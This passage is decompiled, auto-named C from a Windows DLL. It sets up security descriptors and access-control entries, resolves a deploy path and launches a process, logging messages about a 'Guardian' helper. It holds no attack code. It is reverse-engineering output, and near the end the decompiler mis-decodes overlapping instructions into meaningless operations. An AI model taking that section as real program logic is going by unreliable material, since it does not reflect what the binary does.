  undefined4 uStack_b4;
  undefined4 uStack_b0;
  undefined4 uStack_ac;
  undefined4 local_a8;
  undefined4 uStack_a4;
  undefined4 uStack_a0;
  undefined4 uStack_9c;
  undefined4 local_98;
  undefined4 uStack_94;
  undefined4 uStack_90;
  int iStack_8c;
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  iVar7 = 0;
  local_1bc = 0;
  local_1a0 = 0;
  local_1a8 = 0;
  local_1b4 = 0;
  local_1c0 = 0;
  local_19c[0] = 0;
  if ((DAT_10099158 & 1) == 0) {
    DAT_10099158 = DAT_10099158 | 1;
    FUN_100064d0();
    FUN_10057b51(&LAB_10078190);
  }
  local_1ac = 0;
  if (DAT_100990dc != (code *)0x0) {
    uVar4 = (*DAT_10079264)(0x20008,&local_1ac);
    iVar5 = (*DAT_100990dc)(uVar4);
    if (iVar5 != 0) {
      unaff_ESI = (code *)FUN_1002e700();
      iVar7 = FUN_1002e680();
      local_1bc = iVar7;
      FUN_100579ee(unaff_ESI);
      (*DAT_10079270)(local_1ac);
    }
  }
  local_190 = 0;
  local_18c = 0x500;
  local_19c[1] = 0;
  local_194 = 0x100;
  if ((((DAT_100990e4 != (code *)0x0) &&
       (iVar5 = (*DAT_100990e4)(&local_190,1,0x12,0,0,0,0,0,0,0,&local_1a0), iVar5 != 0)) &&
      (iVar5 = (*DAT_100990e4)(&local_190,2,0x20,0x220,0,0,0,0,0,0,&local_1a8), iVar5 != 0)) &&
     (((iVar5 = (*DAT_100990e4)(&local_190,2,0x20,0x221,0,0,0,0,0,0,&local_1b4), iVar5 != 0 &&
       (iVar5 = (*DAT_100990e4)(&local_190,2,0,8,0,0,0,0,0,0,&local_1c0), iVar5 != 0)) &&
      (iVar5 = (*DAT_100990e4)(local_19c + 1,1,0,0,0,0,0,0,0,0,local_19c), iVar5 != 0)))) {
    FUN_1005ff60(local_c8,0,0xc0);
    FUN_1005ff60(local_188,0,0xc0);
    iVar5 = 1;
    local_c8[0] = 0x1f01ff;
    local_c8[1] = 2;
    local_c8[2] = 3;
    uStack_b4 = 0;
    uStack_b0 = 1;
    uStack_ac = local_1a0;
    local_188[0] = 0x1f01ff;
    local_188[1] = 2;
    local_188[2] = 3;
    local_188[3] = local_c8[3];
    local_178 = local_b8;
    uStack_174 = 0;
    uStack_170 = 1;
    uStack_16c = local_1a0;
    if ((DAT_100990e8 == (code *)0x0) || (iVar6 = (*DAT_100990e8)(iVar7,local_1a0), iVar6 == 0)) {
      local_a8 = 0x1f01ff;
      uStack_a4 = 2;
      uStack_a0 = 3;
      uStack_90 = 1;
      iVar5 = 2;
      uStack_94 = 0;
      iStack_8c = iVar7;
      local_168 = 0x1f01ff;
      uStack_164 = 2;
      uStack_160 = 3;
      uStack_15c = uStack_9c;
      local_158 = local_98;
      uStack_154 = 0;
      uStack_150 = 1;
      iStack_14c = iVar7;
    }
    local_1b8 = 0;
    local_1a4 = 0;
    local_c8[iVar5 * 8 + 7] = local_1a8;
    iVar7 = iVar5 + 1;
    local_c8[iVar5 * 8] = 0x1f01ff;
    local_c8[iVar5 * 8 + 1] = 2;
    local_c8[iVar5 * 8 + 2] = 3;
    local_c8[iVar5 * 8 + 5] = 0;
    local_c8[iVar5 * 8 + 6] = 2;
    iVar6 = local_c8[iVar5 * 8 + 1];
    iVar1 = local_c8[iVar5 * 8 + 2];
    iVar2 = local_c8[iVar5 * 8 + 3];
    local_188[iVar5 * 8] = local_c8[iVar5 * 8];
    local_188[iVar5 * 8 + 1] = iVar6;
    local_188[iVar5 * 8 + 2] = iVar1;
    local_188[iVar5 * 8 + 3] = iVar2;
    iVar6 = local_c8[iVar5 * 8 + 4];
    iVar1 = local_c8[iVar5 * 8 + 5];
    iVar2 = local_c8[iVar5 * 8 + 6];
    iVar3 = local_c8[iVar5 * 8 + 7];
    local_c8[iVar7 * 8] = 0x1301bf;
    local_c8[iVar7 * 8 + 1] = 2;
    local_c8[iVar7 * 8 + 2] = 3;
    local_c8[iVar7 * 8 + 5] = 0;
    local_c8[iVar7 * 8 + 6] = 2;
    local_188[iVar5 * 8 + 4] = iVar6;
    local_188[iVar5 * 8 + 5] = iVar1;
    local_188[iVar5 * 8 + 6] = iVar2;
    local_188[iVar5 * 8 + 7] = iVar3;
    local_c8[iVar7 * 8 + 7] = local_1b4;
    iVar6 = local_c8[iVar7 * 8 + 1];
    iVar1 = local_c8[iVar7 * 8 + 2];
    iVar2 = local_c8[iVar7 * 8 + 3];
    local_188[iVar7 * 8] = local_c8[iVar7 * 8];
    local_188[iVar7 * 8 + 1] = iVar6;
    local_188[iVar7 * 8 + 2] = iVar1;
    local_188[iVar7 * 8 + 3] = iVar2;
    iVar6 = local_c8[iVar7 * 8 + 5];
    iVar1 = local_c8[iVar7 * 8 + 6];
    iVar2 = local_c8[iVar7 * 8 + 7];
    local_188[iVar7 * 8 + 4] = local_c8[iVar7 * 8 + 4];
    local_188[iVar7 * 8 + 5] = iVar6;
    local_188[iVar7 * 8 + 6] = iVar1;
    local_188[iVar7 * 8 + 7] = iVar2;
    local_188[iVar7 * 8] = 0x20019;
    iVar7 = iVar5 + 2;
    local_c8[iVar7 * 8 + 7] = local_1b4;
    iVar6 = iVar5 + 3;
    local_c8[iVar7 * 8] = 0x1f0000;
    unaff_ESI = (code *)(iVar5 + 4);
    local_c8[iVar7 * 8 + 1] = 2;
    local_c8[iVar7 * 8 + 2] = 3;
    local_c8[iVar7 * 8 + 5] = 0;
    local_c8[iVar7 * 8 + 6] = 2;
    iVar5 = local_c8[iVar7 * 8 + 1];
    iVar1 = local_c8[iVar7 * 8 + 2];
    iVar2 = local_c8[iVar7 * 8 + 3];
    local_188[iVar7 * 8] = local_c8[iVar7 * 8];
    local_188[iVar7 * 8 + 1] = iVar5;
    local_188[iVar7 * 8 + 2] = iVar1;
    local_188[iVar7 * 8 + 3] = iVar2;
    iVar5 = local_c8[iVar7 * 8 + 4];
    iVar1 = local_c8[iVar7 * 8 + 5];
    iVar2 = local_c8[iVar7 * 8 + 6];
    iVar3 = local_c8[iVar7 * 8 + 7];
    local_c8[iVar6 * 8] = 0x1f01ff;
    local_c8[iVar6 * 8 + 1] = 4;
    local_188[iVar7 * 8 + 4] = iVar5;
    local_188[iVar7 * 8 + 5] = iVar1;
    local_188[iVar7 * 8 + 6] = iVar2;
    local_188[iVar7 * 8 + 7] = iVar3;
    local_c8[iVar6 * 8 + 7] = local_19c[0];
    local_c8[iVar6 * 8 + 2] = 3;
    local_c8[iVar6 * 8 + 5] = 0;
    local_c8[iVar6 * 8 + 6] = 2;
    iVar7 = local_c8[iVar6 * 8 + 1];
    iVar5 = local_c8[iVar6 * 8 + 2];
    iVar1 = local_c8[iVar6 * 8 + 3];
    local_188[iVar6 * 8] = local_c8[iVar6 * 8];
    local_188[iVar6 * 8 + 1] = iVar7;
    local_188[iVar6 * 8 + 2] = iVar5;
    local_188[iVar6 * 8 + 3] = iVar1;
    iVar7 = local_c8[iVar6 * 8 + 5];
    iVar5 = local_c8[iVar6 * 8 + 6];
    iVar1 = local_c8[iVar6 * 8 + 7];
    local_188[iVar6 * 8 + 4] = local_c8[iVar6 * 8 + 4];
    local_188[iVar6 * 8 + 5] = iVar7;
    local_188[iVar6 * 8 + 6] = iVar5;
    local_188[iVar6 * 8 + 7] = iVar1;
    if (((DAT_100990f0 != (code *)0x0) &&
        (iVar7 = (*DAT_100990f0)(unaff_ESI,local_c8,0,&local_1b8), iVar7 == 0)) &&
       (iVar7 = (*DAT_100990f0)(unaff_ESI,local_188,0,&local_1a4), iVar7 == 0)) {
      FUN_1044084d();
      iVar7 = (*unaff_EDI)(0x40,0x14);
      local_1b0 = (*unaff_EDI)(0x40,0x14);
      unaff_ESI = DAT_10079288;
      if ((iVar7 != 0) && (local_1b0 != 0)) {
        if ((((DAT_100990f4 != (code *)0x0) &&
             ((iVar5 = (*DAT_100990f4)(iVar7,1), iVar5 != 0 &&
              (iVar5 = (*DAT_100990f4)(local_1b0,1), iVar5 != 0)))) && (DAT_100990f8 != (code *)0x0)
            ) && (((iVar5 = (*DAT_100990f8)(iVar7,1,local_1b8,0), iVar5 != 0 &&
                   (iVar5 = (*DAT_100990f8)(local_1b0,1,local_1a4,0), iVar5 != 0)) &&
                  (DAT_100990fc != (code *)0x0)))) {
          (*DAT_100990fc)(param_1,4,iVar7);
        }
        (*unaff_ESI)(iVar7);
        (*unaff_ESI)(local_1b0);
      }
      (*unaff_ESI)(local_1b8);
      (*unaff_ESI)(local_1a4);
    }
  }
  if (local_1bc != 0) {
    FUN_100579ee(local_1bc);
  }
  FUN_101bdf49();
  (*unaff_ESI)();
  if (local_1a8 != 0) {
    (*unaff_ESI)(local_1a8);
  }
  if (local_1b4 != 0) {
    (*unaff_ESI)(local_1b4);
  }
  if (local_19c[0] != 0) {
    (*unaff_ESI)(local_19c[0]);
  }
  FUN_100579df();
  return;
}



/* Function: FUN_10021a40 */

int * __thiscall FUN_10021a40(int *param_1,int param_2,int param_3)

{
  bool bVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  int *piVar5;
  undefined4 uVar6;
  int *piVar7;
  undefined4 extraout_EDX;
  code *pcVar8;
  int local_14;
  void *local_10;
  undefined1 *puStack_c;
  uint local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10075828;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  piVar2 = (int *)FUN_100581b4(0x22e,DAT_100956e0 ^ (uint)&stack0xfffffffc);
  if (piVar2 != (int *)0x0) {
    piVar2[1] = 0x110;
    *piVar2 = 0;
    piVar2[2] = 0;
    *(undefined2 *)(piVar2 + 3) = 0;
  }
  *param_1 = (int)piVar2;
  local_8 = 0;
  iVar3 = FUN_10010370(0,1);
  *param_1 = iVar3;
  if (iVar3 == 0) {
    if (piVar2 != (int *)0x0) {
      LOCK();
      iVar3 = *piVar2;
      *piVar2 = iVar3 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(piVar2);
      }
    }
    if (*param_1 != 0) goto LAB_10021acf;
LAB_10021ada:
    iVar3 = 0;
  }
  else {
LAB_10021acf:
    if (*param_1 == 0) goto LAB_10021ada;
    iVar3 = *param_1 + 0xc;
  }
  local_14 = param_2;
  bVar1 = false;
  if ((DAT_1009b4dc & 1) == 0) {
    DAT_1009b4dc = DAT_1009b4dc | 1;
    FUN_1001a9a0();
    FUN_10057b51(&DAT_100784c0);
  }
  pcVar8 = DAT_10079264;
  if (((param_3 == 0) && (local_14 == 0)) &&
     ((DAT_1009b4e8 == (code *)0x0 || ((*DAT_1009b4e8)(4,&DAT_10084ce0,&local_14), local_14 == 0))))
  {
    bVar1 = true;
    iVar4 = (*pcVar8)();
    piVar2 = (int *)FUN_10018da0(0,0);
    local_8._0_1_ = 1;
    if (iVar4 != 0) {
      FUN_10022ca0(iVar4);
    }
    local_8 = (uint)local_8._1_3_ << 8;
    local_14 = 0;
    piVar5 = (int *)*piVar2;
    piVar7 = (int *)0x0;
    if (piVar5 != piVar2) {
      do {
        if (&DAT_10084ce0 < (undefined *)piVar5[3]) break;
        piVar7 = piVar5 + 2;
        piVar5 = (int *)*piVar5;
      } while (piVar5 != piVar2);
      if (piVar7 != (int *)0x0) {
        local_14 = piVar7[1];
      }
    }
    FUN_10022c10();
    pcVar8 = DAT_10079264;
  }
  if ((DAT_1009b554 & 1) == 0) {
    DAT_1009b554 = DAT_1009b554 | 1;
    FUN_1001aca0();
    FUN_10057b51(&DAT_10078500);
  }
  if (DAT_1009b570 != (code *)0x0) {
    if ((DAT_1009b554 & 1) == 0) {
      DAT_1009b554 = DAT_1009b554 | 1;
      FUN_1001aca0();
      FUN_10057b51(&DAT_10078500);
    }
    uVar6 = (*pcVar8)(local_14,iVar3,0x104);
    iVar3 = (*DAT_1009b570)(uVar6);
    FUN_1000bca0(iVar3);
    if (iVar3 != 0) goto LAB_10021cfb;
  }
  if ((DAT_1009b4e4 != (code *)0x0) || (DAT_1009b4e4 = DAT_100790f4, DAT_100790f4 != (code *)0x0)) {
    piVar2 = (int *)FUN_100581b4(0x22e);
    if (piVar2 != (int *)0x0) {
      piVar2[1] = 0x110;
      *piVar2 = 0;
      piVar2[2] = 0;
      *(undefined2 *)(piVar2 + 3) = 0;
    }
    local_8 = CONCAT31(local_8._1_3_,2);
    piVar7 = (int *)FUN_10010370(0,1);
    if (piVar7 == (int *)0x0) {
      if (piVar2 != (int *)0x0) {
        LOCK();
        iVar3 = *piVar2;
        *piVar2 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(piVar2);
        }
      }
      piVar2 = (int *)0x0;
    }
    else {
      piVar2 = piVar7 + 3;
    }
    uVar6 = (*DAT_1009b4e4)(local_14,piVar2,0x104);
    FUN_1000bca0(uVar6);
    FUN_106667b7(extraout_EDX);
    iVar3 = FUN_10010440(piVar7);
    *param_1 = iVar3;
    local_8 = local_8 & 0xffffff00;
    if (piVar7 != (int *)0x0) {
      LOCK();
      iVar3 = *piVar7;
      *piVar7 = iVar3 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(piVar7);
      }
    }
  }
LAB_10021cfb:
  if ((((param_2 == 0) && (local_14 != 0)) && (DAT_1009b52c != (code *)0x0)) && (!bVar1)) {
    (*DAT_1009b52c)(local_14);
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_10021d40 */

uint __fastcall FUN_10021d40(int *param_1,code *param_2)

{
  short sVar1;
  int *piVar2;
  int iVar3;
  undefined4 *puVar4;
  short *psVar5;
  int iVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  bool bVar10;
  uint local_8;
  
  iVar3 = FUN_1000bdd0(&DAT_10086a98,param_1);
  *param_1 = iVar3;
  if (iVar3 == 0) {
    uVar8 = 0;
  }
  else {
    uVar8 = *(uint *)(iVar3 + 8);
  }
  local_8 = uVar8 - 1;
  bVar10 = local_8 < uVar8;
  if (bVar10) {
    while( true ) {
      uVar7 = uVar8;
      piVar2 = (int *)*param_1;
      uVar8 = uVar7 + 1;
      if ((piVar2 == (int *)0x0) || (*piVar2 == 0)) {
        puVar4 = (undefined4 *)FUN_10010290(uVar8);
      }
      else {
        if (uVar8 < piVar2[2] + 1U) {
          uVar8 = piVar2[2] + 1U;
        }
        if (uVar8 < 0x10000) {
          uVar9 = 0x10;
          if (0x10 < uVar8) {
            uVar9 = uVar8;
          }
          uVar8 = uVar9 + 0xf & 0xfffffff0;
        }
        else {
          uVar8 = uVar8 + 0xffff & 0xffff0000;
        }
        puVar4 = (undefined4 *)FUN_100581b4(uVar8 * 2 + 0xe);
        if (puVar4 != (undefined4 *)0x0) {
          puVar4[1] = uVar8;
          *puVar4 = 0;
          puVar4[2] = piVar2[2];
          FUN_1005d740(puVar4 + 3,piVar2 + 3,piVar2[2] * 2 + 2);
          LOCK();
          iVar3 = *piVar2;
          *piVar2 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee(piVar2);
          }
        }
      }
      *param_1 = (int)puVar4;
      if ((puVar4 == (undefined4 *)0x0) && (piVar2 != (int *)0x0)) {
        LOCK();
        iVar3 = *piVar2;
        *piVar2 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(piVar2);
        }
      }
      if ((*param_1 == 0) || (iVar3 = *param_1 + 0xc, iVar3 == 0)) break;
      uVar8 = (*param_2)(iVar3,uVar7);
      iVar3 = *param_1;
      if (iVar3 != 0) {
        psVar5 = (short *)(iVar3 + 0xc);
        if (psVar5 == (short *)0x0) {
          iVar6 = 0;
        }
        else {
          do {
            sVar1 = *psVar5;
            psVar5 = psVar5 + 1;
          } while (sVar1 != 0);
          iVar6 = (int)psVar5 - (iVar3 + 0xe) >> 1;
        }
        *(int *)(iVar3 + 8) = iVar6;
        *(undefined2 *)(iVar3 + 0xc + iVar6 * 2) = 0;
      }
      local_8 = uVar7;
      if (uVar8 <= uVar7) {
        return (uint)(uVar8 <= uVar7);
      }
    }
    bVar10 = local_8 < uVar7;
  }
  return 1 - bVar10;
}



/* Function: FUN_10021ec0 */

undefined4 * __thiscall
FUN_10021ec0(undefined4 *param_1,short *param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5)

{
  uint uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10075863;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
    uVar2 = FUN_1000bd10(uVar1);
  }
  else {
    uVar2 = FUN_1000ba60();
  }
  *param_1 = uVar2;
  local_8 = 0;
  if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
    uVar3 = FUN_1000bd10(uVar1);
    uVar2 = extraout_ECX_00;
  }
  else {
    uVar3 = FUN_1000ba60();
    uVar2 = extraout_ECX;
  }
  param_1[1] = uVar3;
  local_8 = CONCAT31(local_8._1_3_,1);
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  param_1[5] = 0;
  param_1[6] = 0;
  param_1[7] = param_5;
  param_1[8] = 0;
  param_1[9] = 0;
  param_1[10] = 0;
  param_1[0xb] = 0;
  param_1[0xc] = 0;
  FUN_10021fa0(param_2,param_3,uVar2,param_5);
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_10021fa0 */

/* WARNING: Instruction at (ram,0x100225c0) overlaps instruction at (ram,0x100225be)
    */
/* WARNING: Removing unreachable block (ram,0x100225c2) */

void __thiscall
FUN_10021fa0(undefined4 *param_1,undefined4 param_2,int param_3,undefined4 param_4,
            undefined4 param_5)

{
  char cVar1;
  undefined4 uVar2;
  int iVar3;
  int *piVar4;
  undefined4 *puVar5;
  int *piVar6;
  undefined **ppuVar7;
  int *piVar8;
  int iVar9;
  undefined4 extraout_ECX;
  int *extraout_ECX_00;
  int extraout_ECX_01;
  undefined1 *puVar10;
  char cVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  undefined4 uVar16;
  undefined4 *puVar17;
  undefined4 local_cc [11];
  undefined4 local_a0;
  undefined2 local_9c;
  int *local_80;
  int *local_7c;
  undefined4 local_78;
  wchar_t *local_74;
  undefined **local_70;
  int *local_6c;
  int *local_68;
  int *local_64;
  int *local_60;
  undefined4 *local_5c;
  undefined4 local_58;
  int *local_54;
  int *local_50;
  int *local_4c;
  int *local_48 [6];
  int local_30;
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100758c8;
  local_10 = ExceptionList;
  local_14 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_5c = param_1;
  uVar2 = FUN_1000bdd0(param_2,param_1);
  *local_5c = uVar2;
  piVar4 = local_5c + 1;
  local_50 = piVar4;
  iVar3 = FUN_1000bdd0(param_2,local_5c);
  *piVar4 = iVar3;
  local_5c[7] = param_5;
  local_5c[8] = 0;
  local_5c[9] = 0;
  local_5c[10] = 0;
  local_5c[0xb] = 0;
  local_5c[0xc] = 0;
  iVar3 = FUN_1000bfa0(&DAT_10083854,0xffffffff);
  *piVar4 = iVar3;
  if (param_3 != 0) {
    iVar3 = FUN_1000bfa0(param_3,0xffffffff);
    *piVar4 = iVar3;
  }
  iVar3 = FUN_1000ad70(&DAT_10086aa0,0xffffffff,0);
  if (iVar3 != -1) {
    uVar2 = FUN_10059ab0();
    local_8 = 0;
    piVar4 = (int *)FUN_10022970(uVar2,extraout_ECX);
    local_68 = piVar4;
    if ((*local_50 == 0) || (*local_50 == -0xc)) {
      local_48[0] = (int *)0x0;
    }
    else {
      local_48[0] = (int *)FUN_100106a0(&local_68,0);
    }
    local_8 = 0xffffffff;
    if (piVar4 != (int *)0x0) {
      LOCK();
      iVar3 = *piVar4;
      *piVar4 = iVar3 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(piVar4);
      }
    }
    piVar4 = local_50;
    if (local_48[0] == (int *)0x0) {
      FUN_10059ab0();
      piVar4 = local_50;
    }
  }
  iVar3 = FUN_1000ad70(&DAT_1008401c,0xffffffff,0);
  if (iVar3 == -1) {
    puVar5 = (undefined4 *)FUN_10021a40(0,0);
    local_60 = (int *)*puVar5;
    if (local_60 != (int *)0x0) {
      LOCK();
      *local_60 = *local_60 + 1;
      UNLOCK();
    }
    local_8 = 1;
    local_7c = local_60;
    local_68 = local_60;
    if (local_48[0] != (int *)0x0) {
      LOCK();
      iVar3 = *local_48[0];
      *local_48[0] = iVar3 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(local_48[0]);
      }
    }
    if (local_60 != (int *)0x0) {
      LOCK();
      *local_60 = *local_60 + 1;
      UNLOCK();
    }
    FUN_1000c820(1);
    FUN_10019e10(&local_58);
    local_8 = CONCAT31(local_8._1_3_,3);
    piVar4 = (int *)FUN_1000ae10(local_48);
    if (*piVar4 == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = *piVar4 + 0xc;
    }
    FUN_10006250("binary deploy path: \'%s\'\n",iVar3);
    if (local_48[0] != (int *)0x0) {
      LOCK();
      iVar3 = *local_48[0];
      *local_48[0] = iVar3 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(local_48[0]);
      }
    }
    if (local_58 != (int *)0x0) {
      LOCK();
      iVar3 = *local_58;
      *local_58 = iVar3 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(local_58);
      }
    }
    local_4c = (int *)*local_50;
    if (local_4c != (int *)0x0) {
      LOCK();
      *local_4c = *local_4c + 1;
      UNLOCK();
    }
    local_8 = CONCAT31(local_8._1_3_,4);
    FUN_1000f0c0();
    local_64 = (int *)FUN_1000ad70(&DAT_10083854,0xffffffff,0);
    if (local_64 != (int *)0xffffffff) {
      local_4c = (int *)FUN_100228f0(local_64);
    }
    piVar4 = local_4c;
    iVar3 = FUN_1004b640(L".exe",4);
    if (iVar3 == -1) {
      piVar4 = (int *)FUN_1000bfa0(L".exe",0xffffffff);
      local_4c = piVar4;
    }
    local_74 = L"x86\\";
    local_70 = &PTR_10083554;
    local_78 = 0;
    local_48[0] = (int *)0x0;
    do {
      puVar5 = (undefined4 *)FUN_10019e10(&local_6c);
      FUN_10010440(*puVar5);
      if (local_6c != (int *)0x0) {
        LOCK();
        iVar3 = *local_6c;
        *local_6c = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(local_6c);
        }
      }
      piVar6 = (int *)FUN_1000bfa0((&local_74)[(int)local_48[0]],0xffffffff);
      if (piVar6 != (int *)0x0) {
        LOCK();
        *piVar6 = *piVar6 + 1;
        UNLOCK();
      }
      if ((piVar4 == (int *)0x0) || (ppuVar7 = (undefined **)(piVar4 + 3), piVar4[2] == 0)) {
        ppuVar7 = &PTR_10083554;
      }
      local_80 = piVar6;
      local_58 = (int *)FUN_1000bfa0(ppuVar7,0xffffffff);
      uVar2 = FUN_10019e10(&local_54);
      local_8 = CONCAT31(local_8._1_3_,8);
      FUN_100213b0(uVar2);
      piVar8 = local_54;
      if (local_54 != (int *)0x0) {
        LOCK();
        iVar3 = *local_54;
        *local_54 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(local_54);
          piVar8 = extraout_ECX_00;
        }
      }
      if (local_30 != 0) {
        local_48[0] = (int *)FUN_1000bdd0(&DAT_10084020,piVar8);
        piVar8 = (int *)FUN_10019e10(&local_54);
        iVar3 = *piVar8;
        if ((iVar3 != 0) && (*(int *)(iVar3 + 8) != 0)) {
          local_48[0] = (int *)FUN_1000bfa0(iVar3 + 0xc,*(undefined4 *)(iVar3 + 8));
        }
        if (local_54 != (int *)0x0) {
          LOCK();
          iVar3 = *local_54;
          *local_54 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee(local_54);
          }
        }
        local_4c = (int *)FUN_1000bfa0(&DAT_10084020,0xffffffff);
        local_54 = (int *)FUN_10010440(piVar6);
        if (local_58 != (int *)0x0) {
          LOCK();
          iVar3 = *local_58;
          *local_58 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee(local_58);
          }
        }
        if (local_64 != (int *)0xffffffff) {
          if (*local_50 == 0) {
            iVar3 = 0;
          }
          else {
            iVar3 = *(int *)(*local_50 + 8);
          }
          piVar8 = (int *)FUN_100227f0(&local_64,iVar3 - (int)local_64);
          iVar3 = *piVar8;
          if ((iVar3 != 0) && (*(int *)(iVar3 + 8) != 0)) {
            local_4c = (int *)FUN_1000bfa0(iVar3 + 0xc,*(undefined4 *)(iVar3 + 8));
          }
          if (local_64 != (int *)0x0) {
            LOCK();
            iVar3 = *local_64;
            *local_64 = iVar3 + -1;
            UNLOCK();
            if (iVar3 + -1 < 0) {
              FUN_100579ee(local_64);
            }
          }
        }
        iVar3 = FUN_10010440(local_4c);
        *local_50 = iVar3;
        if (local_4c != (int *)0x0) {
          LOCK();
          iVar3 = *local_4c;
          *local_4c = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee(local_4c);
          }
        }
        if (piVar6 != (int *)0x0) {
          LOCK();
          iVar3 = *piVar6;
          *piVar6 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee(piVar6);
          }
        }
        if (piVar4 != (int *)0x0) {
          LOCK();
          iVar3 = *piVar4;
          *piVar4 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee(piVar4);
          }
        }
        if (local_60 != (int *)0x0) {
          LOCK();
          iVar3 = *local_60;
          *local_60 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee(local_60);
          }
        }
        local_8 = 0xffffffff;
        piVar4 = local_50;
        if (local_54 != (int *)0x0) {
          LOCK();
          iVar3 = *local_54;
          *local_54 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee(local_54);
            piVar4 = local_50;
          }
        }
        goto LAB_100224f8;
      }
      local_8 = CONCAT31(local_8._1_3_,6);
      if (local_58 != (int *)0x0) {
        LOCK();
        iVar3 = *local_58;
        *local_58 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(local_58);
        }
      }
      local_48[0] = (int *)((int)local_48[0] + 1);
    } while (local_48[0] < (int *)0x2);
    if (piVar6 != (int *)0x0) {
      LOCK();
      iVar3 = *piVar6;
      *piVar6 = iVar3 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(piVar6);
      }
    }
    if (piVar4 != (int *)0x0) {
      LOCK();
      iVar3 = *piVar4;
      *piVar4 = iVar3 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(piVar4);
      }
    }
    if (local_60 != (int *)0x0) {
      LOCK();
      iVar3 = *local_60;
      *local_60 = iVar3 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(local_60);
      }
    }
    puVar10 = &stack0xfffffffc;
    if (local_68 != (int *)0x0) {
      LOCK();
      iVar3 = *local_68;
      *local_68 = *local_68 + -1;
      UNLOCK();
      puVar10 = &stack0xfffffffc;
      if (iVar3 + -1 < 0) {
        FUN_100579ee(local_68);
        puVar10 = &stack0xfffffffc;
      }
    }
  }
  else {
LAB_100224f8:
    FUN_1005ff60(local_cc,0,0x44);
    local_cc[0] = 0x44;
    iVar3 = FUN_1001ac40();
    if (*(int *)(iVar3 + 4) == 0) {
      local_a0 = 1;
      local_9c = 7;
    }
    local_5c[2] = 0;
    local_5c[3] = 0;
    local_5c[4] = 0;
    local_5c[5] = 0;
    piVar6 = (int *)FUN_1000ae10(&local_64);
    if (*piVar6 == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = *piVar6 + 0xc;
    }
    FUN_10006250("CCreateProcess: %s\n",iVar3);
    if (local_64 != (int *)0x0) {
      LOCK();
      iVar3 = *local_64;
      *local_64 = iVar3 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(local_64);
      }
    }
    if (*piVar4 == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = *piVar4 + 0xc;
    }
    cVar11 = &DAT_fffffff7 < local_5c;
    puVar17 = local_5c + 2;
    puVar5 = local_cc;
    uVar16 = 0;
    uVar15 = 0;
    uVar14 = 0xc000200;
    uVar13 = 0;
    uVar12 = 0;
    uVar2 = 0;
    cVar1 = FUN_104c39c3(0);
    puVar10 = (undefined1 *)((int)&local_8 + 3);
    if ((char)((cVar1 + 'u') - cVar11) < '\0') {
      *(char *)(extraout_ECX_01 + 0x3f751841) =
           *(char *)(extraout_ECX_01 + 0x3f751841) + (char)extraout_ECX_01;
      iVar9 = (int)&local_58 + 3;
    }
    else {
      iVar9 = 0x8b;
      swi(4);
    }
    piVar4 = (int *)FUN_1000ae10(iVar9);
    if (*piVar4 == 0) {
      iVar9 = 0;
    }
    else {
      iVar9 = *piVar4 + 0xc;
    }
    FUN_10006250("Process \'%s\' failed to start.\n \t\t\tRescue developers!\n \t\t\tPlease note, that Guardian is not copied in DEBUG by default.\n \t\t\tDo it manually!\n"
                 ,iVar9,iVar3,uVar2,uVar12,uVar13,uVar14,uVar15,uVar16,puVar5,puVar17);
